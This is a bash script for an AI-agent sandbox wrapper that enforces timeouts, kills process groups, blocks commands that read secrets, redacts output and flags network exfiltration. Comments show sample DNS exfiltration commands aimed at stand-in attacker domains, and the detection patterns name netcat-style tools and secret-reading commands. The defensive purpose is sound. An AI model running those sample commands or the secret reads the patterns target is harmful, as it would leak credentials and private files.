#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: 2025-2026 Marcus Quinn
# sandbox-exec-helper.sh — Lightweight execution sandbox for tool/command isolation
# Commands: run | audit | config | help
#
# Wraps command execution with environment clearing, timeout enforcement,
# temp directory isolation, optional network restriction, and network tiering.
# Inspired by OpenFang's WASM sandbox — adapted for shell-native use.
#
# Network tiering (t1412.3): When --network-tiering is enabled, commands that
# access the network have their target domains classified into tiers (1-5).
# Tier 5 domains (exfiltration indicators) are logged and flagged. Tier 4
# (unknown) domains are allowed but flagged for post-session review.
# See network-tier-helper.sh for the full tier model.
#
# Usage:
#   sandbox-exec-helper.sh run command [args...]
#   sandbox-exec-helper.sh run --timeout 60 --no-network curl example.com
#   sandbox-exec-helper.sh run --network-tiering --worker-id w123 curl example.com
#   sandbox-exec-helper.sh run --allow-secret-io gopass show path  # explicit override
#   sandbox-exec-helper.sh run --passthrough "GITHUB_TOKEN,NPM_TOKEN" npm publish
#   sandbox-exec-helper.sh audit [--last N]
#   sandbox-exec-helper.sh config --show
#   sandbox-exec-helper.sh help
#
# Note: command and its arguments are passed as separate shell words (not a
# single quoted string). This avoids bash -c eval and correctly handles
# arguments containing spaces.

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)" || exit
# shellcheck source=shared-constants.sh
source "${SCRIPT_DIR}/shared-constants.sh"
set -euo pipefail

LOG_PREFIX="SANDBOX"

# =============================================================================
# Constants
# =============================================================================

readonly SANDBOX_DIR="${HOME}/.aidevops/.agent-workspace/sandbox"
readonly SANDBOX_LOG="${SANDBOX_DIR}/executions.jsonl"
readonly SANDBOX_TMP_BASE="${SANDBOX_DIR}/tmp"
readonly SANDBOX_DEFAULT_TIMEOUT=120
readonly SANDBOX_MAX_TIMEOUT=3600
readonly SANDBOX_MAX_OUTPUT_BYTES=10485760 # 10MB per stream
readonly SECRET_IO_GUARD_DEFAULT="true"

# Minimal environment passthrough — only what's needed for basic operation
readonly DEFAULT_PASSTHROUGH="PATH HOME USER LANG TERM SHELL"

# Network tier helper (t1412.3)
readonly NET_TIER_HELPER="${SCRIPT_DIR}/network-tier-helper.sh"

# Quarantine helper (t1428.4)
readonly QUARANTINE_HELPER="${SCRIPT_DIR}/quarantine-helper.sh"

# =============================================================================
# Helpers
# =============================================================================

log_sandbox() {
	local level="$1"
	local msg="$2"
	printf '[%s] [%s] [%s] %s\n' \
		"$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$LOG_PREFIX" "$level" "$msg" >&2
}

# Log execution to JSONL audit trail
log_execution() {
	local command="$1"
	local exit_code="$2"
	local duration="$3"
	local timeout_used="$4"
	local network_blocked="${5:-false}"
	local passthrough_vars="${6:-}"
	local timestamp
	timestamp="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

	mkdir -p "$(dirname "$SANDBOX_LOG")"

	# Truncate command for logging (no secrets, max 500 chars)
	local logged_cmd="${command:0:500}"

	# Use jq to safely generate the JSON log entry — prevents JSON/log injection
	# via backslashes, newlines, or other special characters in the command string.
	local log_entry
	log_entry=$(jq -n \
		--arg ts "$timestamp" \
		--arg cmd "$logged_cmd" \
		--argjson exit "$exit_code" \
		--argjson duration "$duration" \
		--argjson timeout "$timeout_used" \
		--argjson network_blocked "$network_blocked" \
		--arg passthrough "$passthrough_vars" \
		'{ts: $ts, cmd: $cmd, exit: $exit, duration_s: $duration, timeout: $timeout, network_blocked: $network_blocked, passthrough: $passthrough}')

	printf '%s\n' "$log_entry" >>"$SANDBOX_LOG"
	return 0
}

# Detect high-risk commands that could expose secret values in transcript output.
# Returns 0 and prints a reason when command should be blocked.
# Returns 1 when command appears safe.
_sandbox_secret_block_reason() {
	local command="$1"
	local normalized
	normalized="$(printf '%s' "$command" | tr '[:upper:]' '[:lower:]')"

	if [[ "$normalized" =~ (^|[[:space:];|&])(gopass|pass)[[:space:]]+(show|cat)([[:space:]]|$) ]]; then
		echo "password manager value read command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])op[[:space:]]+read([[:space:]]|$) ]]; then
		echo "1Password secret read command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])cat[[:space:]]+([^[:space:]]*/)?(\.env([^[:space:]]*)?|credentials\.sh|[^[:space:]]*secret[^[:space:]]*)($|[[:space:];|&]) ]]; then
		echo "file read command targeting likely secret material"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])(echo|printenv)[[:space:]]+\$?[a-z_][a-z0-9_]*(secret|token|key|password|passwd|pwd|credential|client_secret|access_token)([[:space:];|&]|$) ]]; then
		echo "environment variable value print command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])env[[:space:]]*\|[[:space:]]*(grep|rg)([[:space:];|&]|$) ]]; then
		echo "environment dump piped to search command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])kubectl[[:space:]]+get[[:space:]]+secret([[:space:]]|$) ]]; then
		echo "kubernetes secret read command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])docker[[:space:]]+inspect([[:space:]]|$) ]] || [[ "$normalized" =~ (^|[[:space:];|&])docker[[:space:]]+exec[[:space:]].*[[:space:]]env([[:space:];|&]|$) ]]; then
		echo "docker environment inspection command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])pm2[[:space:]]+env([[:space:]]|$) ]]; then
		echo "pm2 environment dump command"
		return 0
	fi

	return 1
}

# Determine whether command/output should be treated as secret-tainted.
# Tainted commands get stronger output handling (warning + redaction).
_sandbox_is_secret_tainted_command() {
	local command="$1"
	local normalized
	normalized="$(printf '%s' "$command" | tr '[:upper:]' '[:lower:]')"

	if _sandbox_secret_block_reason "$command" >/dev/null 2>&1; then
		return 0
	fi

	if [[ "$normalized" =~ oauth/access_token|client_secret|access_token|refresh_token|authorization:[[:space:]]*bearer ]]; then
		return 0
	fi

	return 1
}

# Apply Python-based secret redaction to a file, writing result to stdout.
# Arguments: $1=file path
# Caller is responsible for redirecting stdout to stderr if needed.
_sandbox_redact_with_python() {
	local input_file="$1"
	python3 - "$input_file" <<'PY'
import os
import re
import sys

path = sys.argv[1]
try:
    text = open(path, "r", encoding="utf-8", errors="replace").read()
except Exception:
    sys.exit(0)

candidate_values = []
for key, value in os.environ.items():
    upper = key.upper()
    if any(token in upper for token in ["SECRET", "TOKEN", "PASSWORD", "API_KEY", "ACCESS_KEY", "PRIVATE_KEY", "CLIENT_SECRET", "AUTH"]):
        if value and len(value) >= 8:
            candidate_values.append(value)

for value in sorted(set(candidate_values), key=len, reverse=True):
    text = text.replace(value, "[REDACTED_SECRET]")

patterns = [
    (re.compile(r'(?i)(authorization\s*:\s*bearer\s+)([A-Za-z0-9._~+/=-]+)'), r'\1[REDACTED_SECRET]'),
    (re.compile(r'(?i)(access_token|refresh_token|client_secret|api[_-]?key|password|token|secret)(\s*[:=]\s*)("?[^"\s,}]+"?)'), r'\1\2"[REDACTED_SECRET]"'),
]

for pattern, repl in patterns:
    text = pattern.sub(repl, text)

sys.stdout.write(text)
PY
	return 0
}

# Redact likely secret values from a captured output file.
# Arguments: $1=file path, $2=stream name (stdout|stderr), $3=tainted_flag
_sandbox_emit_redacted_output() {
	local output_file="$1"
	local stream_name="$2"
	local tainted_flag="$3"

	if [[ ! -f "$output_file" ]] || [[ ! -s "$output_file" ]]; then
		return 0
	fi

	local truncated_file
	truncated_file="$(mktemp)"
	head -c "$SANDBOX_MAX_OUTPUT_BYTES" "$output_file" >"$truncated_file"

	if [[ "$tainted_flag" == "true" ]]; then
		local warning_msg="[sandbox] WARNING: secret-tainted command detected — output is redacted"
		if [[ "$stream_name" == "stderr" ]]; then
			printf '%s\n' "$warning_msg" >&2
		else
			printf '%s\n' "$warning_msg"
		fi
	fi

	if command -v python3 >/dev/null 2>&1; then
		if [[ "$stream_name" == "stderr" ]]; then
			_sandbox_redact_with_python "$truncated_file" >&2
		else
			_sandbox_redact_with_python "$truncated_file"
		fi
	else
		if [[ "$stream_name" == "stderr" ]]; then
			cat "$truncated_file" >&2
		else
			cat "$truncated_file"
		fi
	fi

	rm -f "$truncated_file"
	return 0
}

# =============================================================================
# Network Tiering Integration (t1412.3)
# =============================================================================

# Extract domains from a command string and check them against network tiers.
# Best-effort heuristic: parses URLs and hostnames from common patterns
# (curl, wget, git clone, npm install from URL, etc.).
# Arguments:
#   $1 - command string
#   $2 - worker ID for logging
_sandbox_check_network_tiers() {
	local command="$1"
	local wid="$2"

	# --- DNS exfiltration shape detection (t1428.1, CVE-2025-55284) ---
	# Check for DNS tool usage with dynamic data BEFORE domain extraction.
	# DNS exfil encodes stolen data as subdomain labels — the destination
	# domain is often attacker-controlled and unknown to our tier list.
	# Detecting the command SHAPE catches exfil regardless of destination.
	_sandbox_check_dns_exfil "$command" "$wid"

	# Extract potential domains from the command using multiple strategies:
	# 1. Full URLs: https://domain.com/... or http://domain.com/...
	# 2. Bare hostnames after networking tools: curl example.com, wget host.io
	# 3. Git SSH patterns: git@github.com:user/repo.git
	# 4. SCP-style: scp file user@host.example.com:/path
	# 5. DNS tools: dig domain.com, nslookup domain.com, host domain.com
	# Excludes: @scope/package (npm), single-label names (localhost, etc.)
	local domains=""
	local url_domains bare_domains git_ssh_domains dns_domains

	# Strategy 1: Extract domains from http(s) URLs
	url_domains="$(printf '%s' "$command" | grep -oE 'https?://[a-zA-Z0-9._-]+' | sed -E 's|https?://||')" || true

	# Strategy 2: Extract bare hostnames after networking tools that take a URL/host
	# as their primary argument (curl, wget, etc.). Tools where arguments are mixed
	# (scp, rsync) are handled by Strategy 3 via user@host patterns instead.
	# Requires TLD of 2+ alpha chars to avoid matching filenames like "file.txt"
	# and excludes common file extensions (.sh, .py, .js, .json, .txt, .log, .yml, .yaml, .md, .conf)
	bare_domains="$(printf '%s' "$command" | grep -oE '(curl|wget|fetch|nc|ncat|telnet)\s+(-[a-zA-Z0-9]+\s+)*([a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,})' | grep -oE '[a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,}$' | grep -vE '\.(sh|py|js|ts|json|txt|log|yml|yaml|md|conf|cfg|xml|html|css|gz|tar|zip)$')" || true

	# Strategy 3: Extract hosts from user@host patterns (git SSH, ssh, scp, etc.)
	# Matches both git@github.com:user/repo and user@server.example.com
	git_ssh_domains="$(printf '%s' "$command" | grep -oE '[a-zA-Z0-9_-]+@([a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,})' | sed 's/.*@//')" || true

	# Strategy 4 (t1428.1): Extract domains from DNS tool arguments
	# Catches: dig example.com, nslookup evil.io, host attacker.net
	# Strips flags (dig +short, dig @resolver), trailing dots (FQDN notation),
	# and record types (A, AAAA, TXT, MX, etc.)
	dns_domains="$(printf '%s' "$command" | grep -oE '\b(dig|nslookup|host)\s+[^|;&]*' | sed -E 's/\b(dig|nslookup|host)\s+//' | grep -oE '[a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,}\.?' | sed 's/\.$//' | grep -vE '^\$|^`')" || true

	# Combine and deduplicate all extracted domains
	domains="$(printf '%s\n%s\n%s\n%s' "$url_domains" "$bare_domains" "$git_ssh_domains" "$dns_domains" | grep -v '^$' | sort -u)" || true

	if [[ -z "$domains" ]]; then
		return 0
	fi

	local domain tier_result
	while IFS= read -r domain; do
		[[ -z "$domain" ]] && continue
		tier_result="$("$NET_TIER_HELPER" classify "$domain")" || true

		if [[ "$tier_result" == "5" ]]; then
			log_sandbox "WARN" "Network tier DENY: ${domain} (Tier 5 — exfiltration indicator)"
			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-deny" || true
			# Quarantine denied domains for review — user may want to allow (t1428.4)
			if [[ -x "$QUARANTINE_HELPER" ]]; then
				"$QUARANTINE_HELPER" add \
					--source sandbox-exec \
					--severity HIGH \
					--category denied_domain \
					--content "$domain" \
					--worker-id "$wid" \
					>/dev/null 2>&1 || true
			fi
		elif [[ "$tier_result" == "4" ]]; then
			log_sandbox "INFO" "Network tier FLAG: ${domain} (Tier 4 — unknown domain)"
			# Note: Tier 4 quarantine is handled by network-tier-helper.sh log_access
			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-flag" || true
		else
			# Tiers 1-3: log silently (tier helper handles routing)
			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-allow" || true
		fi
	done <<<"$domains"

	return 0
}

# Detect DNS exfiltration command shapes (t1428.1, CVE-2025-55284).
# DNS exfil encodes stolen data as subdomain labels in DNS queries:
#   dig $(cat /etc/passwd | base64).attacker.com
#   nslookup $(whoami).evil.example
#   echo "secret" | base64 | xargs -I{} dig {}.attacker.com
# These bypass HTTP-layer controls because DNS resolution is typically
# unrestricted. Existing Tier 5 blocks known exfil services but not
# attacker-owned domains. This function catches the command SHAPE.
# Arguments:
#   $1 - command string
#   $2 - worker ID for logging
_sandbox_check_dns_exfil() {
	local command="$1"
	local wid="$2"
	local dns_exfil_detected=false

	# Pattern 1: DNS tool with command substitution ($(...), ${...}, `...`)
	if printf '%s' "$command" | grep -qE '\b(dig|nslookup|host)\b.*(\$\(|\$\{|`)'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS tool with command substitution (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 2: base64/encoding piped to DNS tool
	if printf '%s' "$command" | grep -qE '\b(base64|xxd|od[[:space:]]+-[AaxX]|hexdump)\b.*\|[[:space:]]*(dig|nslookup|host)\b'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: Encoded data piped to DNS tool (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 3: DNS tool inside a loop (bulk exfil)
	if printf '%s' "$command" | grep -qE '\b(for|while)\b.*\b(dig|nslookup|host)\b.*\bdone\b'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS tool inside loop construct (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 4: DNS-over-HTTPS with dynamic data
	if printf '%s' "$command" | grep -qE '(dns-query|dns\.google|cloudflare-dns\.com/dns-query|doh\.).*(\$\(|\$\{|`)'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS-over-HTTPS with dynamic data (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 5: Known DNS exfiltration service domains
	# These are attacker-controlled DNS logging services. Any DNS query or
	# HTTP request to these domains is a strong exfil indicator.
	if printf '%s' "$command" | grep -qiE '\b(dnslog\.cn|ceye\.io|interact\.sh|burpcollaborator\.net|oastify\.com|oast\.(fun|me|live))\b'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: Known exfiltration service domain (worker=${wid})"
		dns_exfil_detected=true
	fi

	if [[ "$dns_exfil_detected" == true ]]; then
		# Log to audit trail if available
		local audit_helper="${SCRIPT_DIR}/audit-log-helper.sh"
		if [[ -x "$audit_helper" ]]; then
			"$audit_helper" log security.event \
				"DNS exfiltration command shape detected" \
				--detail "worker=${wid}" \
				--detail "command=${command:0:200}" 2>/dev/null || true
		fi
	fi

	return 0
}

# =============================================================================
# Sandbox Execution
# =============================================================================

# Kill a child process group and its secondary watchdog.
# Standalone cleanup function — called explicitly on all exit paths and
# as an EXIT trap safety net. Takes explicit arguments instead of relying
# on closure variables (extracted from nested _pgkill_cleanup in GH#6429).
#
# Arguments:
#   $1 - watchdog_pid (may be empty)
#   $2 - child_pgid (may be empty)
#   $3 - child_pid (may be empty)
_sandbox_pgkill_cleanup() {
	local cleanup_watchdog_pid="$1"
	local cleanup_child_pgid="$2"
	local cleanup_child_pid="$3"

	# Kill the secondary watchdog first to prevent it from firing
	# after we've already cleaned up the child.
	if [[ -n "$cleanup_watchdog_pid" ]]; then
		kill "$cleanup_watchdog_pid" 2>/dev/null || true
		wait "$cleanup_watchdog_pid" 2>/dev/null || true
	fi

	if [[ -n "$cleanup_child_pgid" ]]; then
		# SIGTERM first — allow graceful shutdown
		kill -- "-${cleanup_child_pgid}" 2>/dev/null || true
		# Brief grace period, then SIGKILL any survivors
		sleep 0.5
		kill -0 -- "-${cleanup_child_pgid}" 2>/dev/null &&
			kill -9 -- "-${cleanup_child_pgid}" 2>/dev/null || true
	elif [[ -n "$cleanup_child_pid" ]]; then
		# Fallback: setsid unavailable — kill direct child process only
		kill "$cleanup_child_pid" 2>/dev/null || true
		sleep 0.5
		kill -0 "$cleanup_child_pid" 2>/dev/null &&
			kill -9 "$cleanup_child_pid" 2>/dev/null || true
	fi
	return 0
}

# Start a command in a new process group via setsid.
# Sets caller-scoped variables: child_pid, child_pgid, child_start_token
# (uses bash dynamic scoping — caller must declare these as local).
#
# Arguments: stdout_file stderr_file cmd [args...]
# Fallback: if setsid is unavailable, runs directly and leaves child_pgid
# empty so _sandbox_pgkill_cleanup falls back to killing child_pid.
_sandbox_spawn_child() {
	local sc_stdout_file="$1"
	local sc_stderr_file="$2"
	shift 2

	# setsid creates a new session (and process group) so the child and all
	# its descendants share a PGID distinct from the wrapper's PGID.
	# stdout/stderr are redirected here so the redirection applies to the
	# backgrounded child process, not to the polling loop.
	#
	# --stream-stdout mode (GH#15180 bug #4): when stream_stdout=true (set
	# by sandbox_run via dynamic scoping), stdout is NOT redirected to the
	# capture file. Instead it flows to the caller's stdout (e.g., through
	# a pipe to tee in headless-runtime-helper.sh) so external watchdogs
	# can monitor activity in real-time. Stderr is still captured. The
	# capture file remains empty; _sandbox_emit_redacted_output handles
	# this gracefully (returns early on empty/missing files).
	if command -v setsid &>/dev/null; then
		if [[ "${stream_stdout:-false}" == "true" ]]; then
			setsid "$@" 2>"$sc_stderr_file" &
		else
			setsid "$@" >"$sc_stdout_file" 2>"$sc_stderr_file" &
		fi
		child_pid=$!
		# Retrieve the process group ID of the child.
		# On Linux: ps -o pgid= returns the PGID. On macOS: same flag works.
		# If ps fails (race: child already exited), clear pgid to fall back
		# to killing child_pid directly in _sandbox_pgkill_cleanup.
		child_pgid="$(ps -o pgid= -p "$child_pid" 2>/dev/null | tr -d ' ')" || true
		if [[ -z "$child_pgid" ]] || [[ "$child_pgid" == "0" ]]; then
			child_pgid=""
		fi
	else
		if [[ "${stream_stdout:-false}" == "true" ]]; then
			"$@" 2>"$sc_stderr_file" &
		else
			"$@" >"$sc_stdout_file" 2>"$sc_stderr_file" &
		fi
		child_pid=$!
		# setsid not available — child shares the script's process group.
		# Do NOT read the PGID here: ps would return the script's own PGID,
		# causing _sandbox_pgkill_cleanup to kill the wrapper itself.
		child_pgid=""
	fi

	# PID recycling safety: capture a stable identity token at spawn time.
	# On Linux, use /proc/<pid>/stat field 22 (starttime in clock ticks since
	# boot). On macOS/other, use 'ps -o lstart=' for absolute start timestamp.
	# If the lookup fails (child already exited), token is empty — the watchdog
	# will skip signal delivery (safe: child already gone).
	child_start_token="$(_sandbox_get_proc_starttime "$child_pid")"
	return 0
}

# Poll until a child process exits or the timeout deadline is reached.
# Returns 0 if the child exited on its own, 124 if the timeout was reached.
#
# Arguments:
#   $1 - timeout in seconds
#   $2 - child_pid to monitor
_sandbox_poll_child() {
	local poll_timeout="$1"
	local poll_child_pid="$2"
	local half_secs_remaining=$((poll_timeout * 2))

	while kill -0 "$poll_child_pid" 2>/dev/null; do
		if ((half_secs_remaining <= 0)); then
			return 124
		fi
		sleep 0.5
		((half_secs_remaining--)) || true
	done
	return 0
}

# Runs cmd in a new process group (via setsid) and kills the entire group
# when the timeout expires or the function exits. This ensures that worker
# child processes (MCP servers, node workers, etc.) are also terminated —
# a plain `timeout` only kills its direct child (GH#5530).
#
# Arguments: t_secs stdout_file stderr_file cmd [args...]
# stdout/stderr are passed as file paths (not via shell redirection on the
# function call) so the redirection applies to the backgrounded child, not
# to the polling loop in this function.
#
# Process group lifecycle (GH#5530):
# The worker process spawns its own child processes. A plain `timeout` only
# kills its direct child — grandchildren survive indefinitely. Fix: run the
# command in a new process group via `setsid`, then kill the entire group
# (kill -- -PGID) on timeout or exit. Cleanup is called explicitly on all
# exit paths — the EXIT trap is a safety net for unexpected exits only.
#
# Secondary watchdog (GH#6413):
# The primary polling loop uses sleep 0.5 + counter decrement. If the parent
# process crashes, gets OOM-killed, or the sleep drifts, the child (in its
# own session via setsid) survives indefinitely. Fix: spawn a background
# watchdog process that independently tracks wall-clock time via date(1) and
# kills the child process group if the deadline is exceeded. The watchdog is
# killed on normal exit to avoid orphaned watchers.
_sandbox_exec_with_pgkill() {
	local t_secs="$1"
	local t_stdout_file="$2"
	local t_stderr_file="$3"
	shift 3
	local child_pid=""
	local child_pgid=""
	local child_start_token=""
	local t_exit_code=0
	local watchdog_pid=""

	# EXIT trap uses a closure-style wrapper to pass current variable values
	# to the standalone cleanup function.
	trap '_sandbox_pgkill_cleanup "$watchdog_pid" "$child_pgid" "$child_pid"' EXIT

	# Spawn the child in a new process group (sets child_pid, child_pgid,
	# child_start_token via dynamic scoping).
	_sandbox_spawn_child "$t_stdout_file" "$t_stderr_file" "$@"

	# Marker file for watchdog-initiated kills (GH#6414, CodeRabbit review).
	# Derived from t_stderr_file path to avoid collisions across concurrent
	# sandbox invocations (unlike a global /tmp/ path with PID suffix).
	local t_watchdog_marker="${t_stderr_file}.watchdog_timeout"

	# Secondary watchdog (GH#6413): independent wall-clock timeout enforcement.
	# 10% grace period avoids racing with the primary loop's normal timeout.
	# GH#6538: use _sandbox_spawn_watchdog_bg so the watchdog process appears
	# as "bash -c ... sandbox-watchdog" in ps, not as "sandbox-exec-helper.sh
	# run ... opencode run ... /full-loop ..." — preventing it from being
	# counted as a duplicate active worker by list_active_worker_processes().
	_sandbox_spawn_watchdog_bg "$t_secs" "$child_pid" "$child_pgid" "$child_start_token" "$t_watchdog_marker"
	watchdog_pid=$!

	# Poll until the child exits or the deadline is reached.
	if ! _sandbox_poll_child "$t_secs" "$child_pid"; then
		log_sandbox "WARN" "Command timed out after ${t_secs}s — killing process group ${child_pgid}"
		_sandbox_pgkill_cleanup "$watchdog_pid" "$child_pgid" "$child_pid"
		watchdog_pid=""
		# Reap the child after killing it
		wait "$child_pid" 2>/dev/null || true
		trap - EXIT
		return 124
	fi

	wait "$child_pid" 2>/dev/null
	t_exit_code=$?

	# Watchdog exit status override (GH#6414, CodeRabbit review): if the
	# secondary watchdog killed the child, it will have touched the marker
	# file. Override the exit code to 124 (standard timeout) so callers can
	# distinguish a watchdog-killed process from a normal non-zero exit.
	if [[ -f "$t_watchdog_marker" ]]; then
		log_sandbox "WARN" "Secondary watchdog marker detected for PID ${child_pid} — overriding exit code to 124"
		t_exit_code=124
		rm -f "$t_watchdog_marker" 2>/dev/null || true
	fi

	# Emit captured stderr to our stderr so callers (headless-runtime-helper)
	# can see errors from the child process. Always emit for headless workers
	# (opencode exits 0 even on silent failures). Truncate to 8KB.
	if [[ -s "$t_stderr_file" ]]; then
		local _stderr_size
		_stderr_size=$(wc -c <"$t_stderr_file" | tr -d ' ')
		log_sandbox "INFO" "Child exited $t_exit_code — captured stderr (${_stderr_size}B):"
		head -c 8192 "$t_stderr_file" >&2
		echo >&2
	fi

	# Explicitly clean up any remaining descendants in the process group.
	# The EXIT trap is cleared below, so cleanup must be called explicitly
	# here — the trap does not fire on a normal function return.
	_sandbox_pgkill_cleanup "$watchdog_pid" "$child_pgid" "$child_pid"
	watchdog_pid=""
	trap - EXIT
	return "$t_exit_code"
}

# Get the start time of a process for PID recycling detection (GH#6414).
# On Linux, reads /proc/<pid>/stat field 22 (starttime in clock ticks since
# boot) — this is the most reliable identity token: monotonic, kernel-sourced,
# and avoids forking ps. On macOS/other, uses ps -o lstart= which returns the
# process start date/time string. Returns empty string if the process doesn't
# exist or the start time can't be determined (non-fatal — the watchdog
# proceeds without the recycling guard in that case).
# Arguments: $1 - PID
_sandbox_get_proc_starttime() {
	local gps_pid="$1"
	local gps_starttime=""

	if [[ -f "/proc/${gps_pid}/stat" ]]; then
		# Linux: field 22 of /proc/<pid>/stat is starttime (clock ticks since boot).
		# Fields are space-separated but field 2 (comm) can contain spaces and
		# parentheses, so we strip it first: remove everything from the first
		# '(' to the last ')' to get clean space-separated fields, then pick
		# field 20 (which is original field 22 after removing the 2-field comm).
		local gps_stat_content=""
		gps_stat_content="$(cat "/proc/${gps_pid}/stat" 2>/dev/null)" || true
		if [[ -n "$gps_stat_content" ]]; then
			# Remove comm field: everything from first '(' to last ')'
			local gps_after_comm=""
			gps_after_comm="${gps_stat_content##*) }"
			# Field 20 in the remaining string = original field 22 (starttime)
			gps_starttime="$(printf '%s' "$gps_after_comm" | awk '{print $20}')" || true
		fi
	else
		# macOS / other: use ps -o lstart= for process start time string.
		# Example output: "Wed Mar 25 14:30:00 2026"
		gps_starttime="$(ps -o lstart= -p "$gps_pid" 2>/dev/null | tr -s ' ')" || true
		# Trim leading/trailing whitespace
		gps_starttime="${gps_starttime#"${gps_starttime%%[![:space:]]*}"}"
		gps_starttime="${gps_starttime%"${gps_starttime##*[![:space:]]}"}"
	fi

	printf '%s' "$gps_starttime"
	return 0
}

# Secondary watchdog for _sandbox_exec_with_pgkill (GH#6413).
# Runs as a background process. Sleeps for timeout + 10% grace, then verifies
# wall-clock elapsed time via date(1) and kills the child process group if
# the deadline has been exceeded. This is defense-in-depth: if the primary
# polling loop in _sandbox_exec_with_pgkill fails (parent crash, OOM, sleep
# drift), this watchdog independently enforces the timeout.
#
# Exit status override (GH#6414): before sending TERM/KILL, the watchdog
# touches the marker file passed as $5. The parent checks for this marker
# after 'wait "$child_pid"' returns and overrides the exit code to 124
# (standard timeout exit code) so callers can distinguish watchdog-killed
# from normal exit. The marker path is derived from t_stderr_file to avoid
# collisions across concurrent sandbox invocations.
#
# PID recycling safety (GH#6414): $4 (child_start_token) is the process
# start time captured at spawn via _sandbox_get_proc_starttime (Linux:
# /proc/<pid>/stat field 22, macOS: ps -o lstart=). Before sending any
# signal, the watchdog re-reads the start time and compares. If they differ,
# the PID has been recycled — the watchdog logs and exits without signalling.
#
# Process identity (GH#6538): the watchdog is spawned via
# _sandbox_spawn_watchdog_bg which uses "( exec bash -c '...' sandbox-watchdog )"
# so the resulting process appears as "bash -c ... sandbox-watchdog" in ps,
# NOT as "sandbox-exec-helper.sh run ... opencode run ... /full-loop ...".
# This prevents list_active_worker_processes() in pulse-wrapper.sh from
# counting the watchdog as a second active worker for the same issue.
#
# Arguments:
#   $1 - timeout_secs (original timeout)
#   $2 - child_pid (PID to monitor)
#   $3 - child_pgid (process group ID, may be empty)
#   $4 - child_start_token (process start time captured at spawn, may be empty)
#   $5 - marker_file (touched before kill to signal timeout to parent)
_sandbox_spawn_watchdog() {
	local wd_timeout="$1"
	local wd_pid="$2"
	local wd_pgid="$3"
	local wd_start_token="$4"
	local wd_marker="$5"
	local wd_start
	wd_start="$(date +%s)"

	# Grace period: 10% of timeout, minimum 5s, maximum 60s.
	# This avoids racing with the primary loop which fires at exactly t_secs.
	local wd_grace=$((wd_timeout / 10))
	if ((wd_grace < 5)); then
		wd_grace=5
	fi
	if ((wd_grace > 60)); then
		wd_grace=60
	fi
	local wd_deadline=$((wd_timeout + wd_grace))

	# Sleep in chunks (30s) so we can exit promptly if the child finishes
	# and our parent kills us. A single long sleep would delay cleanup.
	local wd_slept=0
	while ((wd_slept < wd_deadline)); do
		local wd_chunk=30
		if ((wd_slept + wd_chunk > wd_deadline)); then
			wd_chunk=$((wd_deadline - wd_slept))
		fi
		sleep "$wd_chunk" 2>/dev/null || return 0
		wd_slept=$((wd_slept + wd_chunk))

		# Check if child is still alive — if not, our job is done
		if ! kill -0 "$wd_pid" 2>/dev/null; then
			return 0
		fi
	done

	# Verify wall-clock elapsed time to guard against sleep drift
	local wd_now
	wd_now="$(date +%s)"
	local wd_elapsed=$((wd_now - wd_start))

	if ((wd_elapsed < wd_timeout)); then
		# Sleep returned early (spurious wakeup) — not actually timed out
		return 0
	fi

	# Child is still alive past the deadline — verify PID identity before killing.
	if kill -0 "$wd_pid" 2>/dev/null; then
		# PID recycling safety: re-read the process start time via the same
		# platform-aware helper used at spawn. If the PID has been recycled
		# (new process with the same PID), the start times will differ.
		if [[ -n "$wd_start_token" ]]; then
			local wd_current_token=""
			wd_current_token="$(_sandbox_get_proc_starttime "$wd_pid")"
			if [[ -z "$wd_current_token" ]]; then
				# Lookup returned nothing — process already exited between kill -0 and now
				return 0
			fi
			if [[ "$wd_current_token" != "$wd_start_token" ]]; then
				log_sandbox "WARN" "Secondary watchdog: PID ${wd_pid} start time changed (token mismatch) — PID recycled, skipping kill"
				return 0
			fi
		fi

		log_sandbox "WARN" "Secondary watchdog: child PID ${wd_pid} still alive after ${wd_elapsed}s (timeout=${wd_timeout}s) — killing"

		# Touch marker file before sending signals so the parent can detect
		# that this watchdog (not a normal exit) caused the child's termination.
		# The parent checks for this file after 'wait "$child_pid"' and overrides
		# the exit code to 124.
		touch "$wd_marker" 2>/dev/null || true

		if [[ -n "$wd_pgid" ]]; then
			kill -- "-${wd_pgid}" 2>/dev/null || true
			sleep 1
			kill -0 -- "-${wd_pgid}" 2>/dev/null &&
				kill -9 -- "-${wd_pgid}" 2>/dev/null || true
		else
			kill "$wd_pid" 2>/dev/null || true
			sleep 1
			kill -0 "$wd_pid" 2>/dev/null &&
				kill -9 "$wd_pid" 2>/dev/null || true
		fi
	fi

	return 0
}

# Spawn the secondary watchdog as a background process with a distinct process
# name (GH#6538). Using "( exec bash -c '...' sandbox-watchdog )" replaces the
# forked subshell's process image so ps shows "bash -c ... sandbox-watchdog"
# instead of inheriting the parent's execve() command line
# ("sandbox-exec-helper.sh run ... -- opencode run ... /full-loop ...").
#
# Without this, list_active_worker_processes() in pulse-wrapper.sh matches the
